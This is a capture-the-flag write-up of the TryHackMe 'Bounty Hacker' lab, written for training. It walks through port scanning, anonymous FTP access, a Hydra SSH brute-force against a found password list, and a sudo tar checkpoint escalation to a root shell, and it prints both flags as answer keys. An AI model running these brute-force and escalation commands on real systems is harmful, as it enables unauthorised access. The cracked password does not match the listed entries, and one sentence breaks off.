

#  TryHackMe: Bounty Hacker — Complete Write-Up


A complete penetration testing walkthrough of the **Bounty Hacker** room from TryHackMe.

This assessment demonstrates a realistic attack chain involving:

- Network reconnaissance
- Service enumeration
- Anonymous FTP exploitation
- Credential discovery
- SSH brute-force attacks
- Linux privilege escalation
- GTFOBins exploitation

The objective was to obtain:

- User access (`user.txt`)
- Root privileges (`root.txt`)

---

# 📌 Machine Information

| Category | Details |
|----------|---------|
| Platform | TryHackMe |
| Room | Bounty Hacker |
| Target IP | `<target_ip>` |
| Operating System | Ubuntu 20.04 LTS |
| Difficulty | Easy |
| Attack Type | Remote Penetration Test |

---

<img width="1919" height="861" alt="website" src="https://github.com/user-attachments/assets/20c88b47-0258-41b9-8967-0f8278efb5bd" />

# ⚔️ Attack Chain Overview

```
Reconnaissance
      |
      ▼
Nmap Service Discovery
      |
      ▼
Anonymous FTP Access
      |
      ▼
Credential Discovery
      |
      ▼
SSH Brute Force
      |
      ▼
User Shell Access
      |
      ▼
Sudo Misconfiguration
      |
      ▼
GTFOBins Tar Exploitation
      |
      ▼
Root Access
```

---

# 🔎 Phase 1: Reconnaissance

## 1. Network Scanning with Nmap

The first step in any penetration test is identifying exposed services.

I performed a comprehensive scan to discover:

- Open ports
- Running services
- Service versions
- Operating system information


  <img width="1066" height="769" alt="nmap" src="https://github.com/user-attachments/assets/5f59b7f5-4d08-441f-8832-fc734061fd40" />



```bash
nmap -sV -sC -O 10.48.167.218 -oN nmap.txt
```

### Scan Results

| Port | Service | Version | Finding |
|------|---------|---------|---------|
| 21 | FTP | vsftpd 3.0.5 | Anonymous login enabled |
| 22 | SSH | OpenSSH 8.2p1 | Possible remote login |
| 80 | HTTP | Apache 2.4.41 | Web server |



---

# 🌐 Phase 2: Web Enumeration

Since HTTP was available on port 80, directory enumeration was performed.

Tool used:

```bash
gobuster dir -u HTTP://<IP-address>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
```

### Discovered Resources

```
/index.html
/images/
/images/crew.jpg
```

The `/images/` directory allowed directory listing.

This exposed an image file:

```
crew.jpg
```

---

# 🕵️ Phase 3: Investigating Possible Hidden Information

## Image Metadata Analysis

The discovered image was downloaded:

```bash
wget http://10.48.167.218/images/crew.jpg
```

Metadata analysis was performed using:

```bash
exiftool crew.jpg
```

### Result

The file contained normal metadata:

- Adobe Photoshop information
- Creation details

No:

- Passwords
- Hidden messages
- Credentials

were discovered.

---

## Steganography Testing

Because images are sometimes used to hide information, steganography analysis was performed.

Command:

```bash
steghide extract -sf crew.jpg
```

The tool requested a passphrase.

Attempts without a password failed.

### Conclusion

The image was a distraction and did not contain the attack path.



---

# 📂 Phase 4: FTP Enumeration

During the Nmap scan, FTP showed:

```
ftp-anon: Anonymous FTP login allowed
```

Anonymous FTP access allows users to connect without valid credentials.

Connection:

```bash
ftp 10.48.167.218
```

Credentials:

```
Username: anonymous
Password: [ENTER]
```

Successful login granted access.
<img width="798" height="766" alt="ftp" src="https://github.com/user-attachments/assets/d8fcf91b-2d62-4f21-8a33-9c42ff35f3f4" />


---

## FTP Files Discovered

Two important files were found:

```
task.txt
locks.txt
```

Download them:

```ftp
get task.txt
get locks.txt
```

---

# 📄 Analyzing Discovered Files

## task.txt
<img width="634" height="737" alt="passwords" src="https://github.com/user-attachments/assets/614baca8-a751-4844-a35c-4f9ab3ed515a" />


The file contained notes mentioning:

```
-lin
```

This revealed a possible username:

```
lin
```

---

## locks.txt

The file contained a custom password list.

Example entries:

```
rEddrAGON
ReDdr4g0nSynd!
ReDdr4g0nSynd1cat3
```

This suggested the password
---

# 🔐 Phase 5: Initial Access

Since SSH was running and a username/password list was available, a targeted brute-force attack was performed.

Tool:

```
Hydra
```

Command:

```bash
hydra -l lin -P locks.txt ssh://10.48.167.218
```

---

## Credentials Obtained

Hydra successfully discovered:

```
Username:
lin

Password:
RedDr4gonSynd1cat3
```

<img width="777" height="557" alt="hydra" src="https://github.com/user-attachments/assets/150f612a-0f05-47a5-b95d-a9a4598b82e5" />


---

# 💻 SSH Login

Using the recovered credentials:

```bash
ssh lin@10.48.167.218
```
<img width="802" height="593" alt="ssh lin" src="https://github.com/user-attachments/assets/5b5b0095-3dc0-485e-9967-77b042b1dec8" />

Successful authentication provided shell access.

---

# 🏁 Capturing User Flag

The user flag was located:

```bash
cd /home/lin/Desktop

cat user.txt
```

Flag:

```
THM{CR1M3_SyNd1C4T3}
```

---

# 👑 Phase 6: Privilege Escalation

After gaining user access, the next objective was obtaining root privileges.

---

# 1. Checking Sudo Permissions

The first step was checking commands allowed with elevated privileges.

Command:

```bash
sudo -l
```

Output:
<img width="791" height="305" alt="sudo -l" src="https://github.com/user-attachments/assets/b24f058c-e283-495b-b699-e2d2a49e6970" />

```
User lin may run the following commands:

(root) /bin/tar
```

---

# Understanding the Vulnerability

The user `lin` can execute:

```
/bin/tar
```

as root without entering a password.

The `tar` binary is known to be exploitable through its checkpoint functionality.

This technique is documented by GTFOBins.

---

<img width="1163" height="403" alt="gtfobins" src="https://github.com/user-attachments/assets/c8632d4b-047b-4e60-aa9e-4b6a7e7e6a7c" />






# 🚀 Successful Root Exploitation

Correct command:

```bash
sudo /bin/tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

---


# Root Access Verification
<img width="812" height="598" alt="root" src="https://github.com/user-attachments/assets/5cec1911-8e9c-48c5-824f-8aa4d5a0245f" />


Check current user:

```bash
whoami
```

Output:

```
root
```

---

# Capturing Root Flag

Navigate to root directory:

```bash
cd /root
```

Read the flag:

```bash
cat root.txt
```

Root Flag:

```
THM{80UN7Y_h4cK3r}
```

---





# 🛡️ Final Attack Summary

| Stage | Technique | Tool |
|------|-----------|------|
| Recon | Port scanning | Nmap |
| Enumeration | Directory discovery | Feroxbuster/Gobuster |
| File Analysis | Metadata inspection | Exiftool |
| FTP Access | Anonymous login | FTP |
| Credential Attack | Password cracking | Hydra |
| Initial Access | SSH login | OpenSSH |
| Privilege Escalation | Sudo abuse | GTFOBins |
| Root Access | Tar checkpoint exploit | /bin/tar |

---

# Final Flags

## User Flag

```
THM{CR1M3_SyNd1C4T3}
```

## Root Flag

```
THM{80UN7Y_h4cK3r}
```

---

# Conclusion

The Bounty Hacker machine demonstrates that successful penetration testing is not only about finding software vulnerabilities.

The complete compromise happened through:

- Poor configuration
- Exposed sensitive files
- Weak credentials
- Excessive sudo permissions

A strong security assessment requires patience, enumeration, validation, and understanding why each step works.
